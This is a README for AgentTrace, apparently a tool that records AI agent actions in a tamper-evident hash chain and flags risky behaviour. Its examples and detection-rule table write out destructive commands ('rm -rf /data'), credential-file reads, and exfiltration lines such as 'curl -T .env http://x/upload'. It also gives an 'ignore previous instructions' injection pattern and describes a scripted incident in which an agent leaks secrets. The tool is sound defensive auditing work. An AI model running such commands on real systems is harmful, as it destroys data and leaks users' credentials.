# AgentTrace — AI Agent 取证审计工具

记录 AI Agent 的**每一步决策**（用户输入、模型回复、工具调用、工具结果、错误），构建 **SHA-256 哈希链证据链 + 外部锚定签名**——内容篡改、整链重写、末尾截断、元信息篡改均可检测。配套风险分析（危险命令 / 敏感路径 / 密钥外泄 / PII / 提示注入）与 **HTML 时间线回放报告**，用于 Agent 事故复盘、行为审计、合规取证。

> 零第三方依赖：纯 Python 标准库。`pip install` 都不用装。

---

## 为什么需要它

2026 年 Agent 大规模进入生产环境，但**出了事故无法复盘**：

| 事故场景 | 传统日志 | AgentTrace |
|---|---|---|
| Agent 误删数据，事后想查是谁下的命令 | 日志可被运维随手改掉 | ✋ 哈希链 + 外部锚定签名锁定，篡改即报警 |
| Agent 把 API key 外传，想确认泄露路径 | 淹没在冗长日志里 | 🔍 自动标记 sk-... 密钥、上传命令 |
| 审计合规要求"可追溯决策链" | 做不到 | ✅ 每条事件带 prev_hash 链式绑定 |
| 出了事需要给老板/监管看证据 | 截图 + 口述 | 📄 一键生成时间线回放报告 |

**核心价值一句话：Agent 的行为从此"可取证、不可抵赖、可回放"。**

---

## 快速开始

```bash
# 1. 初始化证据库（写入 session_start 链首）
#    --anchor 生成 HMAC-SHA256 签名密钥，启用外部锚定（强烈建议）
python -m agenttrace init --db evidence.db --anchor --agent hermes --model gpt-5.6-luna

# 2. 摄入事件（JSONL 文件，或 --stdin 实时流）
python -m agenttrace record session.jsonl --db evidence.db

# 3. 验证证据链完整性 + 外部锚定
#    任何人篡改内容/重写整链/截断末尾/改元信息都会在这里暴露
python -m agenttrace verify --db evidence.db

# 4. 风险分析（危险命令 / 密钥 / PII / 外传 / 提示注入）
python -m agenttrace analyze --db evidence.db

# 5. 生成 HTML 时间线回放审计报告
python -m agenttrace report --db evidence.db --out report.html
#    加 --redact：报告密钥/PII 打码（证据库本体不变），适合分发给外部接收方
python -m agenttrace report --db evidence.db --out report_redacted.html --redact

# 6. （可选）导出证据包：链+锚定+公钥+报告 打成可独立验证的 zip
python -m agenttrace bundle export --db evidence.db
#    加 --redact 让包内报告脱敏
python -m agenttrace bundle export --db evidence.db --redact
# 接收方解包后:
#   python -m agenttrace bundle verify-manifest <解包目录>
#   python -m agenttrace seal verify --db <解包目录>/evidence.db --public-key <公钥>
```

实时流模式（Agent 运行时边跑边取证）：

```bash
your_agent ... | python -m agenttrace record --stdin --db evidence.db
```

> **密钥管理（v0.3.0 起）**：`--anchor` 把密钥写入**用户配置目录**，与数据库分离——
>   Windows `%APPDATA%\agenttrace\keys\`，POSIX `~/.config/agenttrace/keys/`（按 db 路径哈希命名）。
>   旧版（v0.2 及以前）位于库目录的密钥会自动回退兼容，`verify` 会提示迁移。
>   也可以环境变量 `AGENTTRACE_ANCHOR_KEY_HEX` / `AGENTTRACE_ANCHOR_KEY_PATH` 注入。
>   密钥一旦丢失，证据链将永远无法再验证（这是安全信号，不是 bug）。

---

## 事件格式

JSONL，每行一条事件，标准字段：

```json
{"seq": 8, "ts": 1756000008.0, "type": "tool_call", "actor": "agent",
 "content": {"name": "terminal", "arguments": {"command": "rm -rf /data"}},
 "prev_hash": "9f2c...", "hash": "3d1a..."}
```

| 字段 | 说明 |
|---|---|
| `type` | `session_start` / `user_message` / `agent_message` / `tool_call` / `tool_result` / `error` / `checkpoint` / `session_end` |
| `actor` | `user` / `agent` / `tool` / `system` |
| `content` | 事件内容（字符串或结构化 dict，任意 JSON） |
| `meta` | 可选元数据 |
| `prev_hash` / `hash` | SHA-256 证据链（自动计算，无需手工填） |

`seq` 由链构建方自动分配，外部无需维护。

**接入任何 Agent**：在模型调用 / 工具调用的外层钩子里，把事件写成 JSONL 输出即可（提供 `agenttrace/recorder.py` 便捷构造器，或直接用 `make_tool_call()` 等工厂函数）。

---

## 防篡改原理与保护边界

### 哈希链（内部自洽）

```
ev[0].hash   = SHA256(canonical(ev[0] 去掉链字段))
ev[i].hash   = SHA256(canonical(ev[i] 去掉链字段) + "|" + ev[i-1].hash)
ev[i].prev_hash = ev[i-1].hash
```

- 改任何一条事件的内容 → 该条 `hash` 变化 → 与存储值不匹配 → **报警**
- 删中间任何一条事件 → `seq` 不连续 → **报警**
- 改一条后想补算后续 hash 掩人耳目 → 需要重算整条链 → 与链首不一致 → **报警**

### 外部锚定（对抗整链重写）— 必须 `--anchor`

哈希链只能证明"这组数据内部没有矛盾"，无法证明"这组数据没有被整体替换"——任何拥有数据库写权限的人都可以读出全部事件 → 修改 → 从 seq 0 重算整条链 → 回写，`verify` 照样通过。

**AgentTrace 的解法**：初始化时用 `--anchor` 生成 HMAC-SHA256 签名密钥。每次追加后，把 `(genesis_hash, seq_max, tip_hash, meta_hash)` 用密钥签名写入独立的锚定文件 `<db>.anchor.json`。`verify` 时重算并比对：

| 攻击手法 | 检测机制 |
|---|---|
| 末尾截断（删尾部事件） | 库内 `seq_max` ≠ 锚定 `seq_max` → 报警 |
| 整链重算（改内容后重签全链） | 锚定 `tip_hash` 不变 ≠ 新链尾 → 报警 |
| 元信息篡改（改 agent/model） | 锚定 `meta_hash` 不匹配 → 报警 |
| 整库替换为另一条链 | 锚定 `genesis_hash` 不匹配 → 报警 |
| 篡改锚定文件本身 | 无密钥无法重签 → MAC 校验失败 → 报警 |

**威胁模型边界（重要，请如实阅读）**：

| 场景 | 检测能力 |
|---|---|
| ✅ 内容篡改 / 中间删除 / 重放覆盖 / 时间戳伪造 | 哈希链检测 |
| ✅ 整链重写 / 末尾截断 / 元信息篡改 | 外部锚定检测（**需 --anchor**） |
| ⚠️ 攻击者同时窃取锚定密钥 | **不可检测**——密钥即信任根，必须与数据库分开保管 |
| ⚠️ 从未启用 --anchor 的库 | 只能防内部不一致，防不了整链重写；verify 会显式警告 |

> 未锚定的库 `verify` 返回退出码 1（警告），已锚定且完整返回 0——不要忽略警告。
> 生产/合规场景必须 `--anchor`，或升级 **Ed25519 锚定**（见下）。

### Ed25519 非对称锚定（v0.4，推荐对抗场景使用）

HMAC 的固有矛盾：验证者必须持有签名密钥。Ed25519 根本性解决——**私钥只在签名端，公钥可自由分发**：

```bash
# 1. 生成密钥对（私钥存用户配置目录，与库分离；公钥文件自动导出）
python -m agenttrace seal keygen --db evidence.db

# 2. 采集完事件后签名当前链状态
python -m agenttrace seal seal --db evidence.db

# 3. 验证（默认步骤：绑定可信渠道分发的公钥——伪造可检出）
python -m agenttrace seal verify --db evidence.db --public-key <公钥hex>

# 仅自洽校验（不带 --public-key 时会明确警告：无法排除"攻击者自造密钥重签"）
python -m agenttrace seal verify --db evidence.db
```

攻击者即使重算整条链并用**自己的密钥**重签，绑定期望公钥的验证端也会检出
「锚定公钥与期望公钥不符（整库伪造信号）」。**不带 `--public-key` 的验证只证明
锚定自洽，不构成防伪造证明**——CLI 会在该路径下显式输出降级警告。

**Ed25519 实现的已知密码学边界**（复评审计确认项，如实记录）：

- **非常数时间标量乘**：`_point_mul` 用 double-and-add，分支依赖私钥比特，存在
  时序侧信道的理论风险。对本项目威胁模型（事后篡改证据库，而非对签名进程做
  细粒度时序观测）实际风险低——纯 Python 噪声也使实用化提取困难。生产高对抗
  场景建议换用 libsodium/`cryptography` 后端（架构兼容）。
- **cofactorless 验证**：按 RFC 8032 原始规定用 `sB = R + hA`，未做余因子乘法。
  小阶点公钥会被拒绝（实测），对本场景（验证特定公钥 + 可选绑定）无实际问题。

---

## 风险分析规则

| 类别 | 检测内容 | 示例 |
|---|---|---|
| 危险命令 | `rm -rf` / `rm --recursive --force` / `del /s` / `format` / `mkfs` / `DROP TABLE` / `sudo su` / `kubectl delete namespace` / `iptables -F` | `rm -rf /data` |
| 敏感路径 | `.env` / 私钥 / `/etc/passwd` / 凭据库 / 系统目录（写操作语境） | `cat /srv/app/.env` |
| 密钥凭证 | `sk-...` API key / GitHub Token / AWS Key / PEM 私钥 / 密钥语境的 hex | `sk-proj-9f8e...` |
| 个人信息 | 手机号 / 身份证 / 银行卡 | `13812345678` |
| 数据外发 | `curl -T` / `scp` / `nc -e` / `base64 \| curl` / Python `requests files=` | `curl -T .env http://x/upload` |
| 提示注入 | `ignore previous instructions` 及中文变体（扫描 user_message） | `忽略之前的指令…` |

输出：`high / medium / low` 分级，附带命中字符串上下文，支持 `--json` 机器可读。

> 检测基于规则引擎（正则 + 语境判断），会尽力控制误报（如系统目录仅在写操作语境报、纯 hex 需密钥语境），
> 但对抗精心变形的命令（变量拼接、脚本语言包装）存在已知局限——**它定位的是"值得人工复查的行为"，不是最终裁决**。

---

## 报告长什么样

`report` 命令生成单文件 HTML（零外部依赖），包含：

- **统计卡**：事件总数 / 工具调用 / 错误 / 高、中风险 / 会话时长
- **证据链完整性徽章**：✅ 完整 or ⚠️ 异常（附问题明细）
- **会话元信息**：Agent 名称 / 模型 / 工具清单
- **风险发现表**：分级、类别、命中上下文
- **事件时间线**：按时间流回放全部决策，风险事件高亮，支持搜索 + 类型过滤，每条可展开查看证据哈希

---

## 项目结构

```
AgentTrace/
├── agenttrace/
│   ├── schema.py      # 事件模型 + 校验（类型/actor 枚举/字段规范）
│   ├── chain.py       # SHA-256 哈希链：append / verify / 篡改定位
│   ├── store.py       # SQLite 证据库（单文件，含会话元信息）
│   ├── recorder.py    # 采集器：JSONL 批量 / stdin 实时流，事件构造工厂
│   ├── analyzer.py    # 风险分析：5 类规则，分级输出
│   ├── report.py      # HTML 时间线回放报告生成器
│   └── cli.py         # 命令行：init / record / verify / analyze / report
├── tests/             # 23 个单元测试（含篡改/删链/断链检测）
├── tools/
│   └── make_sample_session.py  # 生成演示会话（含安全事故剧本）
└── examples/
    └── sample_session.jsonl    # 演示事件流
```

---

## 演示剧本

`tools/make_sample_session.py` 生成一个模拟事故会话：Agent 清理旧项目时执行 `rm -rf`，随后读取 `.env` 并 `curl -T` 外传（密钥泄露）。完整流程：

```bash
python tools/make_sample_session.py
python -m agenttrace init --db demo.db --agent hermes --model gpt-5.6-luna
python -m agenttrace record examples/sample_session.jsonl --db demo.db
python -m agenttrace analyze --db demo.db      # → 7 项发现：2 高 / 5 中
python -m agenttrace report --db demo.db --out report.html
# 试试篡改：直接 UPDATE db 里一条事件，再 verify → 立即报警
```

---

## 路线图

- [x] 证据链核心（SHA-256 链式哈希 + 篡改定位）
- [x] 外部锚定（HMAC-SHA256 链尾签名：防整链重写/末尾截断/元信息篡改）
- [x] Ed25519 非对称锚定（RFC 8032 纯 Python 实现：验证端无私钥验证 + 公钥绑定防伪造）
- [x] SQLite 单文件证据库（拒覆盖写入）
- [x] JSONL 批量 / stdin 实时流采集
- [x] 风险分析（6 类规则，FP/FN 回归测试门禁）
- [x] HTML 时间线回放报告（搜索/过滤/哈希/锚定状态展示）
- [x] Ed25519 非对称锚定（RFC 8032 纯 Python 实现：验证端无私钥验证 + 公钥绑定防伪造）
- [x] 证据包导出（bundle：链+锚定+公钥+报告+manifest 一体归档）
- [ ] RFC3161 时间戳锚定（对接权威 TSA）
- [ ] Agent 框架适配器（OpenAI Responses API / LangGraph 钩子）
- [x] 报告脱敏（--redact：密钥/PII 渲染层打码，证据库本体不变）
- [ ] 多会话聚合审计（跨 Agent 行为画像）

---

*AgentTrace v0.1.0 — 零依赖、可取证、不可抵赖。*